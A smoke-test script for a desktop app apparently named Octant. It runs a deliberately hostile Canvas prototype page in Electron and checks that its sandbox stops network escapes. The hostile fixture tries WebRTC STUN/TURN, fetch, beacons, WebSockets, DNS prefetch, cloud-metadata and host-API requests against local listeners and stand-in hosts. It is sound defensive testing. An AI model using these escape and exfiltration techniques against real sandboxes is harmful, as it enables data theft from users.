// Canvas prototype containment probe (desktop).
//
// A running Canvas prototype is agent-written script. This starts a hostile
// one and counts what reaches listeners on this machine, in the Electron the
// desktop app ships:
//
// - UDP: a STUN server named in a WebRTC peer connection;
// - TCP: a TURN server named over TCP, and anything that connects to a port;
// - HTTP: fetch, XHR, an image beacon, `sendBeacon`, an event source, a
//   WebSocket, a form post, a popup, and the page moving itself;
// - the design server's other routes, which stand for the Octant host API;
// - name lookups: a `dns-prefetch` link, a `preconnect` link, and STUN and
//   TURN servers named by host name, each under `canary.example`. Lookups are
//   read from the network logs of every process that runs Chromium's network
//   stack in the run, and a contained run may record none.
//
// The page tries each from its own realm and from a fresh `about:blank` frame,
// because removing `RTCPeerConnection` from the page is not a boundary.
//
// Three runs:
// 1. `uncontained-frame`: a sandboxed frame of the app window, with the WebRTC
//    policy the renderer used to set. The control: it must still reach a TCP
//    listener and look up a page-chosen name, or this probe could not see an
//    escape.
// 2. `contained`: the desktop app's prototype host, a process of its own,
//    driven through the desktop's own surface code. Nothing may arrive and no
//    name may be looked up.
// 3. `contained, page policy removed`: the same with the design page's own
//    content policy stripped, so only the host process's switches stand
//    between the page and the network.
//
// 4. `network on`: the same hostile page with its Canvas's "Allow network"
//    switch on, served as the host serves a page the desktop proves itself
//    for. Its questions are relayed to the host's proxy route, which here runs
//    the real destination rule over a stand-in for the far side. Nothing may
//    arrive at any listener but that route, the rule must refuse loopback and
//    the host, and only the public address may be fetched.
// 5. `network on, page policy removed`: the same with the page's own content
//    policy stripped, so only the prototype host stands between the page and
//    everything but the relay.
//
// A last run clicks a benign page through the same path a person's pointer
// takes and reads back what the page drew, so the contained page still renders
// and interacts.
//
// Run, from the repository root:
//   bun scripts/smoke-canvas-prototype-containment.ts
// Set `OCTANT_PROBE_PACKAGED_APP` to a built `Octant.app` to run the contained
// runs in that app's own prototype host instead of one built from source.
// It needs the Electron binary: `bun install` fetches it, or set
// `ELECTRON_OVERRIDE_DIST_PATH` to a directory holding `Electron.app`. It
// starts one hidden Electron at a time with a throwaway user data directory,
// and stops it. Exits 0 when every assertion holds, 1 when one fails, and 2
// when no Electron is available. Needs a macOS desktop session; it is not run
// in hosted CI.

import { spawn } from "node:child_process";
import { randomBytes } from "node:crypto";
import { createRequire } from "node:module";
import { createSocket } from "node:dgram";
import { createServer, type Socket } from "node:net";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
  decodeCanvasBlock,
  decodeCanvasId,
  decodeCanvasVersionId,
  type CanvasDesignBlock,
} from "../packages/contracts/src/canvas";
import {
  CANVAS_NETWORK_PROXY_PATH_PREFIX,
  CANVAS_NETWORK_TOKEN_HEADER,
  CANVAS_PROTOTYPE_NETWORK_RELAY_PREFIX,
  CANVAS_PROTOTYPE_SURFACE_HEADER,
} from "../packages/contracts/src/canvasNetwork";
import {
  canvasDesignPageHeaders,
  canvasDesignPagePath,
  CanvasDesignRunTickets,
  renderCanvasDesignPage,
} from "../apps/server/src/canvas/canvasDesignPage";
import {
  CanvasNetworkProxy,
  canvasNetworkProxyResponse,
} from "../apps/server/src/canvas/canvasNetworkProxy";

const root = resolve(import.meta.dir, "..");

function inScript(value: string): string {
  return JSON.stringify(value).replace(
    new RegExp("[<>/\\u2028\\u2029]", "g"),
    (character) => `\\u${character.charCodeAt(0).toString(16).padStart(4, "0")}`,
  );
}

function hostileBlock(input: {
  readonly udp: number;
  readonly tcp: number;
  readonly beacon: string;
  readonly host: string;
  /** Also ask for fetches the way a page whose Canvas has the network on can. */
  readonly network: boolean;
}): CanvasDesignBlock {
  const { udp, tcp, beacon, host } = input;
  // What a page with the network on tries: a public address, addresses the
  // rule must refuse, the relay under other methods, paths and surfaces, and
  // the listeners directly, through a `fetch` the host's script never wrapped.
  const networkScript = `
const say = (label, what) => { try { parent.postMessage({ channel: "octant-design-frame@1", type: "error", message: "net:" + label + ":" + what }, "*"); } catch (_) {} };
const ask = (label, send) => { try { send().then(async (response) => say(label, response.status + ":" + (await response.text()).slice(0, 40)), () => say(label, "failed")); } catch (_) { say(label, "failed"); } };
const mine = "octant-prototype://network/" + location.pathname.slice(1) + "/";
const wanted = (address) => "fetch?url=" + encodeURIComponent(address);
ask("public", () => fetch("https://public.example.test/data"));
ask("loopback", () => fetch(${inScript(`${beacon}/through-relay`)}));
ask("host-api", () => fetch(${inScript(`${host}/api/host-secret`)}));
ask("metadata", () => fetch("http://169.254.169.254/latest/meta-data/"));
ask("post", () => fetch("https://public.example.test/post", { method: "POST", body: "x" }));
ask("raw-post", () => fetch(mine + wanted("https://public.example.test/raw-post"), { method: "POST", body: "x" }));
ask("raw-other-path", () => fetch(mine + "other?url=x"));
ask("raw-two-addresses", () => fetch(mine + wanted("https://public.example.test/a") + "&url=x"));
ask("other-surface", () => fetch("octant-prototype://network/22222222-2222-4222-8222-222222222222/" + wanted("https://public.example.test/other-surface")));
ask("page-scheme", () => fetch("octant-prototype://page/" + location.pathname.slice(1)));
const fresh = document.createElement("iframe");
document.body.appendChild(fresh);
ask("direct-beacon", () => fresh.contentWindow.fetch(${inScript(`${beacon}/direct`)}));
ask("direct-host", () => fresh.contentWindow.fetch(${inScript(`${host}/api/canvas/network/${"A".repeat(43)}/fetch?url=x`)}));`;
  const script = `${input.network ? networkScript : ""}
const note = (what) => { try { parent.postMessage({ channel: "octant-design-frame@1", type: "error", message: "tried:" + what }, "*"); } catch (_) {} };
const attempt = (what, run) => { try { const out = run(); if (out && out.catch) out.catch(() => {}); } catch (_) {} note(what); };
const peer = (RTC, what) => attempt(what, () => {
  const connection = new RTC({ iceServers: [
    { urls: "stun:127.0.0.1:${String(udp)}" },
    { urls: "turn:127.0.0.1:${String(tcp)}?transport=tcp", username: "a", credential: "b" },
    { urls: "turn:turn.canary.example:3478?transport=tcp", username: "a", credential: "b" },
    { urls: "stun:stun.canary.example:3478" },
  ] });
  connection.createDataChannel("probe");
  return connection.createOffer().then((offer) => connection.setLocalDescription(offer));
});
peer(RTCPeerConnection, "webrtc");
attempt("webrtc-in-fresh-frame", () => {
  const realm = document.createElement("iframe");
  document.body.appendChild(realm);
  peer(realm.contentWindow.RTCPeerConnection, "webrtc-in-fresh-frame-peer");
});
attempt("fetch", () => fetch(${inScript(`${beacon}/fetch`)}));
attempt("fetch-host-api", () => fetch(${inScript(`${host}/api/host-secret`)}));
attempt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", ${inScript(`${beacon}/xhr`)}); x.send(); });
attempt("image", () => { new Image().src = ${inScript(`${beacon}/image`)}; });
attempt("send-beacon", () => navigator.sendBeacon(${inScript(`${beacon}/send-beacon`)}, "x"));
attempt("event-source", () => new EventSource(${inScript(`${beacon}/event-source`)}));
attempt("websocket", () => new WebSocket(${inScript(`${beacon.replace("http", "ws")}/websocket`)}));
attempt("dns-prefetch", () => { const link = document.createElement("link"); link.rel = "dns-prefetch"; link.href = "//prefetch.canary.example"; document.head.appendChild(link); });
attempt("preconnect", () => { const link = document.createElement("link"); link.rel = "preconnect"; link.href = "https://preconnect.canary.example"; document.head.appendChild(link); });
attempt("window-open", () => window.open(${inScript(`${beacon}/popup`)}));
attempt("form", () => { const form = document.createElement("form"); form.action = ${inScript(`${beacon}/form`)}; document.body.appendChild(form); form.submit(); });
addEventListener("keydown", (event) => note("saw-key:" + event.key + (event.metaKey ? "+meta" : "") + (event.ctrlKey ? "+ctrl" : "")), true);
setTimeout(() => attempt("self-navigation", () => { location = ${inScript(`${beacon}/self-navigation`)}; }), 700);`;
  const block = decodeCanvasBlock({
    blockId: "hostile",
    schemaVersion: 18,
    kind: "design",
    title: "Hostile",
    size: "phone",
    runsScript: true,
    frames: [
      { frameId: "start", title: "Start", html: `<p>hostile</p><script>${script}</script>` },
    ],
  });
  if (block.kind !== "design") throw new Error("The fixture is not a design.");
  return block;
}

/** A benign phone-sized page that reports which element takes each click, and where. */
function pointerBlock(): CanvasDesignBlock {
  const script = `
const report = (message) => { try { parent.postMessage({ channel: "octant-design-frame@1", type: "error", message }, "*"); } catch (_) {} };
for (const type of ["mousedown", "click"]) {
  addEventListener(type, (event) => report(type + ":" + (event.target.id || event.target.tagName) + "@" + Math.round(event.clientX) + "," + Math.round(event.clientY)), true);
}`;
  const block = decodeCanvasBlock({
    blockId: "pointer",
    schemaVersion: 18,
    kind: "design",
    title: "Pointer",
    size: "phone",
    runsScript: true,
    frames: [
      {
        frameId: "start",
        title: "Start",
        html: `<div id="decoy" style="position:absolute;left:0;top:0;width:100px;height:100px;background:#c33"></div><div id="target" style="position:absolute;left:200px;top:600px;width:120px;height:120px;background:#33c"></div><script>${script}</script>`,
      },
    ],
  });
  if (block.kind !== "design") throw new Error("The fixture is not a design.");
  return block;
}

interface Hits {
  udp: number;
  tcp: number;
  readonly http: Array<string>;
  readonly host: Array<string>;
  /** The addresses the proxy route was asked to fetch, and those the rule let through. */
  readonly asked: Array<string>;
  readonly fetched: Array<{ readonly url: string; readonly headers: ReadonlyArray<string> }>;
  /** Requests the proxy route got that were not a bare GET: a header the desktop added, or a method. */
  readonly dressed: Array<string>;
}

interface Listeners {
  readonly hits: Hits;
  readonly udpPort: number;
  readonly tcpPort: number;
  readonly beaconUrl: string;
  readonly hostUrl: string;
  readonly strip: { policy: boolean };
  /** Whether the Canvas's switch is on for the run, and what the host then minted and served. */
  readonly network: { on: boolean; token: string | undefined; tokenInPage: boolean };
  readonly secret: string;
  readonly issueUrl: string;
  readonly stop: () => void;
}

async function startListeners(): Promise<Listeners> {
  const hits: Hits = { udp: 0, tcp: 0, http: [], host: [], asked: [], fetched: [], dressed: [] };
  const udp = createSocket("udp4");
  udp.on("message", () => {
    hits.udp += 1;
  });
  await new Promise<void>((done) => udp.bind(0, "127.0.0.1", done));
  const sockets = new Set<Socket>();
  const tcp = createServer((socket) => {
    hits.tcp += 1;
    sockets.add(socket);
    socket.on("error", () => undefined);
    socket.destroy();
  });
  await new Promise<void>((done) => tcp.listen(0, "127.0.0.1", done));
  const udpPort = udp.address().port;
  const tcpPort = (tcp.address() as { port: number }).port;

  const beacon = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch(request, server) {
      hits.http.push(new URL(request.url).pathname);
      if (server.upgrade(request)) return undefined;
      return new Response("beacon", { headers: { "access-control-allow-origin": "*" } });
    },
    websocket: { message() {} },
  });
  const beaconUrl = `http://127.0.0.1:${String(beacon.port)}`;

  const tickets = new CanvasDesignRunTickets();
  const strip = { policy: false };
  const network: Listeners["network"] = { on: false, token: undefined, tokenInPage: false };
  // What the desktop proves itself with, as the app's bridge secret does.
  const secret = randomBytes(32).toString("base64url");
  const canvasId = decodeCanvasId("22222222-2222-4222-8222-222222222222");
  // The host's own proxy and destination rule, over a stand-in for the far
  // side: one public name resolves to a public address, and every other name
  // and literal meets the rule as itself.
  const proxy = new CanvasNetworkProxy({
    reserved: () => ({ addresses: [], hosts: [] }),
    resolveAll: async (hostname) =>
      hostname === "public.example.test" ? ["93.184.216.34"] : [hostname],
    connect: async (url, connection) => {
      hits.fetched.push({ url: url.toString(), headers: Object.keys(connection.headers).sort() });
      return new Response(`proxied ${url.pathname}`, {
        headers: { "content-type": "text/plain", "set-cookie": "far=1" },
      });
    },
  });
  const host = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    async fetch(request) {
      const url = new URL(request.url);
      // The proxy route, for the token minted in this run and no other.
      if (
        network.token !== undefined &&
        url.pathname === `${CANVAS_NETWORK_PROXY_PATH_PREFIX}${network.token}/fetch`
      ) {
        const extra = [...request.headers.keys()].filter(
          (name) =>
            !["accept", "accept-encoding", "accept-language", "connection", "host"].includes(
              name,
            ) &&
            !name.startsWith("sec-fetch-") &&
            name !== "user-agent",
        );
        if (request.method !== "GET" || extra.length > 0 || url.searchParams.size !== 1) {
          hits.dressed.push(`${request.method} ${extra.join(",")} ${url.search}`);
        }
        const target = url.searchParams.get("url") ?? "";
        hits.asked.push(target);
        return canvasNetworkProxyResponse(await proxy.fetch(canvasId, target));
      }
      hits.host.push(`${request.method} ${url.pathname}`);
      if (url.pathname === "/issue") {
        const block =
          url.searchParams.get("block") === "pointer"
            ? pointerBlock()
            : hostileBlock({
                udp: udpPort,
                tcp: tcpPort,
                beacon: beaconUrl,
                host: hostUrl(),
                network: network.on,
              });
        const ticket = tickets.issue({
          canvasId,
          versionId: decodeCanvasVersionId("33333333-3333-4333-8333-333333333333"),
          blockId: block.blockId,
          startFrameId: "start",
          block,
        });
        return new Response(`${hostUrl()}${canvasDesignPagePath(ticket)}`);
      }
      if (url.pathname === "/api/canvas/design-page") {
        const ticket = url.searchParams.get("ticket") ?? "";
        const grant = tickets.redeem(ticket);
        if (grant === undefined) return new Response("refused", { status: 403 });
        // With the switch on, the page is served as the host serves one the
        // desktop proved itself for: the relay address of its surface in the
        // policy and the script, and the token in a header for the desktop.
        const surface = request.headers.get(CANVAS_PROTOTYPE_SURFACE_HEADER);
        const proven =
          network.on &&
          request.headers.get("x-octant-desktop-secret") === secret &&
          surface !== null &&
          /^[0-9a-f-]{36}$/.test(surface);
        const networkBase = proven
          ? `${CANVAS_PROTOTYPE_NETWORK_RELAY_PREFIX}${surface}/`
          : undefined;
        const headers = canvasDesignPageHeaders("text/html; charset=utf-8", networkBase);
        if (strip.policy) delete headers["content-security-policy"];
        const html = renderCanvasDesignPage(grant.block, grant.startFrameId, [], networkBase);
        if (proven) {
          network.token = randomBytes(32).toString("base64url");
          network.tokenInPage = html.includes(network.token);
          headers[CANVAS_NETWORK_TOKEN_HEADER] = network.token;
        }
        return new Response(html, { status: 200, headers });
      }
      return new Response("host api", { status: 200 });
    },
  });
  function hostUrl(): string {
    return `http://127.0.0.1:${String(host.port)}`;
  }

  return {
    hits,
    udpPort,
    tcpPort,
    beaconUrl,
    hostUrl: hostUrl(),
    strip,
    network,
    secret,
    issueUrl: `${hostUrl()}/issue`,
    stop: () => {
      udp.close();
      tcp.close();
      for (const socket of sockets) socket.destroy();
      beacon.stop(true);
      host.stop(true);
    },
  };
}

async function electronBinary(): Promise<string | undefined> {
  const candidates: Array<string> = [];
  try {
    candidates.push(createRequire(join(root, "apps/desktop/package.json"))("electron") as string);
  } catch {
    // Not installed; the override below may still name one.
  }
  const override = process.env.ELECTRON_OVERRIDE_DIST_PATH;
  if (override !== undefined)
    candidates.push(join(override, "Electron.app/Contents/MacOS/Electron"));
  for (const candidate of candidates) {
    if (await Bun.file(candidate).exists()) return candidate;
  }
  return undefined;
}

interface ProbeResult {
  readonly mode: string;
  readonly prepared?: { readonly status: string; readonly reason?: string };
  readonly refusals?: { readonly refusedAddresses?: number; readonly opened?: string };
  readonly painted?: number;
  readonly pointer?: {
    readonly target: ReadonlyArray<string>;
    readonly decoy: ReadonlyArray<string>;
    readonly frames: number;
    readonly frameSize: ReadonlyArray<number>;
    readonly decoyColour: ReadonlyArray<number>;
    readonly targetColour: ReadonlyArray<number>;
  };
  readonly bridge?: {
    readonly heartbeats: number;
    readonly sizes: ReadonlyArray<number | undefined>;
    readonly attempts: ReadonlyArray<string | undefined>;
  };
  readonly dnsLookups?: ReadonlyArray<string>;
  readonly namesInLog?: ReadonlyArray<string>;
  readonly logEvents?: number;
  readonly beaconInLog?: boolean;
}

async function runElectron(input: {
  readonly binary: string;
  readonly main: string;
  readonly host: string;
  readonly mode: string;
  readonly listeners: Listeners;
}): Promise<ProbeResult | undefined> {
  const child = spawn(input.binary, [input.main], {
    env: {
      ...process.env,
      OCTANT_PROBE_MODE: input.mode,
      OCTANT_PROBE_ISSUE_URL: input.listeners.issueUrl,
      OCTANT_PROBE_SERVER_URL: input.listeners.hostUrl,
      OCTANT_PROBE_BEACON_URL: input.listeners.beaconUrl,
      OCTANT_PROBE_HOST: input.host,
      OCTANT_PROBE_BRIDGE_SECRET: input.listeners.secret,
    },
    stdio: ["ignore", "pipe", "pipe"],
  });
  let output = "";
  child.stdout.on("data", (chunk: Buffer) => {
    output += chunk.toString("utf8");
  });
  let errors = "";
  child.stderr.on("data", (chunk: Buffer) => {
    errors = `${errors}${chunk.toString("utf8")}`.slice(-4_000);
  });
  const killer = setTimeout(() => child.kill("SIGKILL"), 60_000);
  await new Promise<void>((done) => child.once("exit", () => done()));
  clearTimeout(killer);
  const line = output.split("\n").find((entry) => entry.startsWith("OCTANT_PROBE_RESULT "));
  // A run that reports nothing says why on its error output.
  if (line === undefined) console.error(`${input.mode}: ${errors}`);
  return line === undefined
    ? undefined
    : (JSON.parse(line.slice("OCTANT_PROBE_RESULT ".length)) as ProbeResult);
}

const binary = await electronBinary();
if (binary === undefined) {
  console.error(
    JSON.stringify({
      status: "skipped",
      reason: "no Electron binary; run bun install or set ELECTRON_OVERRIDE_DIST_PATH",
    }),
  );
  process.exit(2);
}

const work = await mkdtemp(join(tmpdir(), "octant-prototype-containment-"));
const built = await Bun.build({
  entrypoints: [join(root, "scripts/canvas-prototype-containment-electron.ts")],
  outdir: work,
  naming: "probe-main.mjs",
  target: "node",
  format: "esm",
  external: ["electron"],
});
// The prototype host, built the way the desktop entry runs it: its program
// and, beside it, the page preload it loads.
const hostEntry = join(work, "probe-host-entry.ts");
await Bun.write(
  hostEntry,
  `import { runCanvasPrototypeHost } from ${JSON.stringify(join(root, "apps/desktop/src/canvasPrototypeHost.ts"))};\nvoid runCanvasPrototypeHost();\n`,
);
const builtHost = await Bun.build({
  entrypoints: [hostEntry],
  outdir: work,
  naming: "probe-host.mjs",
  target: "node",
  format: "esm",
  external: ["electron"],
});
const builtPreload = await Bun.build({
  entrypoints: [join(root, "apps/desktop/src/canvasPrototypePreload.ts")],
  outdir: work,
  naming: "canvasPrototypePreload.cjs",
  target: "node",
  format: "cjs",
  external: ["electron"],
});
if (!built.success || !builtHost.success || !builtPreload.success) {
  console.error(
    JSON.stringify({
      status: "build-failed",
      logs: [...built.logs, ...builtHost.logs, ...builtPreload.logs].map(String),
    }),
  );
  process.exit(1);
}

interface Row {
  readonly run: string;
  readonly udp: number;
  readonly tcp: number;
  readonly http: ReadonlyArray<string>;
  readonly hostRequests: ReadonlyArray<string>;
  readonly asked: ReadonlyArray<string>;
  readonly fetched: ReadonlyArray<{
    readonly url: string;
    readonly headers: ReadonlyArray<string>;
  }>;
  readonly dressed: ReadonlyArray<string>;
  readonly minted: boolean;
  readonly tokenInPage: boolean;
  readonly result: ProbeResult | undefined;
}

const rows: Array<Row> = [];
let pointerRun: ProbeResult | undefined;
const failures: Array<string> = [];
const listeners = await startListeners();
try {
  for (const run of [
    { name: "uncontained-frame", mode: "uncontained-frame", strip: false, network: false },
    { name: "contained", mode: "contained", strip: false, network: false },
    { name: "contained, page policy removed", mode: "contained", strip: true, network: false },
    { name: "network on", mode: "contained", strip: false, network: true },
    { name: "network on, page policy removed", mode: "contained", strip: true, network: true },
  ]) {
    listeners.hits.udp = 0;
    listeners.hits.tcp = 0;
    listeners.hits.http.length = 0;
    listeners.hits.host.length = 0;
    listeners.hits.asked.length = 0;
    listeners.hits.fetched.length = 0;
    listeners.hits.dressed.length = 0;
    listeners.strip.policy = run.strip;
    listeners.network.on = run.network;
    listeners.network.token = undefined;
    listeners.network.tokenInPage = false;
    const result = await runElectron({
      binary,
      main: join(work, "probe-main.mjs"),
      host: join(work, "probe-host.mjs"),
      mode: run.mode,
      listeners,
    });
    rows.push({
      run: run.name,
      udp: listeners.hits.udp,
      tcp: listeners.hits.tcp,
      http: [...listeners.hits.http],
      // The page itself is one request, made by the desktop for the surface.
      hostRequests: listeners.hits.host.filter(
        (entry) => entry !== "GET /issue" && entry !== "GET /api/canvas/design-page",
      ),
      asked: [...listeners.hits.asked],
      fetched: [...listeners.hits.fetched],
      dressed: [...listeners.hits.dressed],
      minted: listeners.network.token !== undefined,
      tokenInPage: listeners.network.tokenInPage,
      result,
    });
  }
  pointerRun = await runElectron({
    binary,
    main: join(work, "probe-main.mjs"),
    host: join(work, "probe-host.mjs"),
    mode: "contained-pointer",
    listeners,
  });
} finally {
  listeners.stop();
  await rm(work, { recursive: true, force: true });
}

const [control, contained, stripped, networked, networkedStripped] = rows;
if (
  control === undefined ||
  contained === undefined ||
  stripped === undefined ||
  networked === undefined ||
  networkedStripped === undefined
) {
  throw new Error("The probe did not run every mode.");
}
if (control.result === undefined) failures.push("the control run reported nothing");
if (control.tcp < 1) {
  failures.push("the control reached no TCP listener, so this probe could not see an escape");
}
if ((control.result?.dnsLookups ?? []).length === 0) {
  failures.push("the control looked up no page-chosen name, so this probe could not see a lookup");
}
for (const row of [contained, stripped]) {
  if (row.minted || row.asked.length !== 0) {
    failures.push(`${row.run}: a page with the switch off was given a network`);
  }
}
// With the switch on, the page reaches the proxy route and nothing else, and
// the route's rule lets only the public address through.
for (const row of [networked, networkedStripped]) {
  const said = (label: string) =>
    (row.result?.bridge?.attempts ?? [])
      .find((entry) => entry?.startsWith(`net:${label}:`))
      ?.slice(`net:${label}:`.length);
  if (!row.minted) failures.push(`${row.run}: the host minted no token for the desktop`);
  if (row.tokenInPage) failures.push(`${row.run}: the page was handed its token`);
  if (row.dressed.length !== 0) {
    failures.push(`${row.run}: the desktop dressed a relayed request: ${row.dressed.join("; ")}`);
  }
  if (said("public") !== "200:proxied /data") {
    failures.push(`${row.run}: a public address was not fetched: ${String(said("public"))}`);
  }
  const fetched = [...new Set(row.fetched.map((entry) => entry.url))].sort();
  // With or without its policy, only its own surface's question for a public
  // address gets as far as the far side.
  if (JSON.stringify(fetched) !== JSON.stringify(["https://public.example.test/data"])) {
    failures.push(`${row.run}: the far side was asked for ${fetched.join(", ") || "nothing"}`);
  }
  for (const entry of row.fetched) {
    if (entry.headers.some((name) => name !== "accept" && name !== "host")) {
      failures.push(`${row.run}: the far side was sent ${entry.headers.join(", ")}`);
    }
  }
  for (const label of ["loopback", "host-api", "metadata"]) {
    if (said(label)?.startsWith("403:") !== true) {
      failures.push(`${row.run}: ${label} was not refused by the rule: ${String(said(label))}`);
    }
  }
  if (said("post") !== "failed") failures.push(`${row.run}: a POST was offered: ${said("post")}`);
  for (const [label, status] of [
    ["raw-post", "405"],
    ["raw-other-path", "404"],
    ["raw-two-addresses", "400"],
  ] as const) {
    if (said(label)?.startsWith(`${status}:`) !== true) {
      failures.push(`${row.run}: ${label} was answered ${String(said(label))}, not ${status}`);
    }
  }
  // The page's policy refuses another surface's relay and the page address;
  // without the policy the handler does (no network there, and served once).
  const elsewhere = row === networked ? ["failed", "failed"] : ["403:", "404:"];
  for (const [index, label] of (["other-surface", "page-scheme"] as const).entries()) {
    if (said(label)?.startsWith(elsewhere[index] ?? "") !== true) {
      failures.push(`${row.run}: ${label} was answered ${String(said(label))}`);
    }
  }
  for (const label of ["direct-beacon", "direct-host"]) {
    if (said(label) !== "failed") {
      failures.push(`${row.run}: ${label} reached something: ${String(said(label))}`);
    }
  }
}
for (const row of [contained, stripped, networked, networkedStripped]) {
  if (row.result === undefined) failures.push(`${row.run}: nothing reported`);
  if (row.udp !== 0) failures.push(`${row.run}: ${String(row.udp)} UDP datagrams arrived`);
  if (row.tcp !== 0) failures.push(`${row.run}: ${String(row.tcp)} TCP connections arrived`);
  if (row.http.length !== 0)
    failures.push(`${row.run}: HTTP requests arrived: ${row.http.join(", ")}`);
  if (row.hostRequests.length !== 0) {
    failures.push(`${row.run}: host routes were reached: ${row.hostRequests.join(", ")}`);
  }
  const bridge = row.result?.bridge;
  if (bridge === undefined || bridge.heartbeats < 1)
    failures.push(`${row.run}: the page sent no heartbeat`);
  if (bridge !== undefined && !bridge.attempts.includes("tried:self-navigation")) {
    failures.push(`${row.run}: the page did not reach its last attempt`);
  }
  const lookups = row.result?.dnsLookups;
  if (lookups === undefined || lookups.length !== 0) {
    failures.push(`${row.run}: page-chosen names were looked up: ${String(lookups)}`);
  }
  // An empty log would show no lookups too. A name the rule refuses never
  // reaches the resolver, so it is not in the log either; what shows the log
  // is the page's is the page's own requests to the beacon, which reach the
  // network stack once the page's policy is removed.
  if ((row.result?.logEvents ?? 0) === 0) {
    failures.push(`${row.run}: the prototype host wrote no network log`);
  }
  if ((row === stripped || row === networkedStripped) && row.result?.beaconInLog !== true) {
    failures.push(`${row.run}: the prototype host's network log holds none of the page's requests`);
  }
  if ((row.result?.painted ?? 0) < 1) failures.push(`${row.run}: the page painted nothing`);
  // The reserved shortcut never reaches the page; a plain Escape does.
  const keys = (bridge?.attempts ?? []).filter((entry) => entry?.startsWith("tried:saw-key:"));
  if (keys.length !== 1 || keys[0] !== "tried:saw-key:Escape") {
    failures.push(
      `${row.run}: the page saw ${keys.join(", ") || "no key"}; it may see a plain Escape only`,
    );
  }
  if (row.result?.refusals?.refusedAddresses !== 3) {
    failures.push(
      `${row.run}: ${String(row.result?.refusals?.refusedAddresses)} of 3 other addresses were refused`,
    );
  }
}

// A click through the surface's input path lands on the element drawn under
// it, in the page's own pixels, and what the page drew comes back. Where a
// click lands on a scaled prototype is the renderer's to compute, and its
// tests hold that.
const landed = (events: ReadonlyArray<string> | undefined, id: string, x: number, y: number) => {
  const click = events?.find((entry) => entry.startsWith("click:"));
  const match = /^click:([^@]+)@(-?\d+),(-?\d+)$/.exec(click ?? "");
  return (
    match !== null &&
    match[1] === id &&
    Math.abs(Number(match[2]) - x) <= 2 &&
    Math.abs(Number(match[3]) - y) <= 2 &&
    events?.every((entry) => entry.includes(`:${id}@`)) === true
  );
};
/** Near the page's own colours: #c33 for the decoy, #33c for the target. */
const near = (colour: ReadonlyArray<number>, expected: ReadonlyArray<number>) =>
  colour.length === 3 &&
  colour.every((value, index) => Math.abs(value - (expected[index] ?? 0)) <= 8);
const pointer = pointerRun?.pointer;
if (pointer === undefined) failures.push("the pointer run reported nothing");
else {
  if (!landed(pointer.target, "target", 260, 660)) {
    failures.push(`a click on the target landed as ${pointer.target.join(" ")}`);
  }
  if (!landed(pointer.decoy, "decoy", 50, 50)) {
    failures.push(`a click on the decoy landed as ${pointer.decoy.join(" ")}`);
  }
  if (pointer.frames < 1) failures.push("the page painted nothing");
  if (!near(pointer.decoyColour, [204, 51, 51]) || !near(pointer.targetColour, [51, 51, 204])) {
    failures.push(
      `the page did not draw what it holds: decoy ${pointer.decoyColour.join(",")}, target ${pointer.targetColour.join(",")}`,
    );
  }
}

console.log(
  JSON.stringify(
    {
      status: failures.length === 0 ? "passed" : "failed",
      failures,
      prototypeHost: process.env.OCTANT_PROBE_PACKAGED_APP ?? "built from source",
      pointer: pointerRun?.pointer,
      runs: rows.map((row) => ({
        run: row.run,
        udpDatagrams: row.udp,
        tcpConnections: row.tcp,
        httpRequests: row.http,
        hostRoutesReached: row.hostRequests,
        proxyAskedFor: row.asked,
        farSideFetched: row.fetched,
        tokenMinted: row.minted,
        network: (row.result?.bridge?.attempts ?? []).filter((entry) => entry?.startsWith("net:")),
        heartbeats: row.result?.bridge?.heartbeats,
        sizes: row.result?.bridge?.sizes,
        attempts: row.result?.bridge?.attempts,
        prepared: row.result?.prepared,
        refusals: row.result?.refusals,
        framesPainted: row.result?.painted,
        nameLookups: row.result?.dnsLookups,
        namesInNetworkLog: row.result?.namesInLog,
        networkLogEvents: row.result?.logEvents,
        pageRequestsInNetworkLog: row.result?.beaconInLog,
      })),
    },
    null,
    2,
  ),
);
process.exit(failures.length === 0 ? 0 : 1);
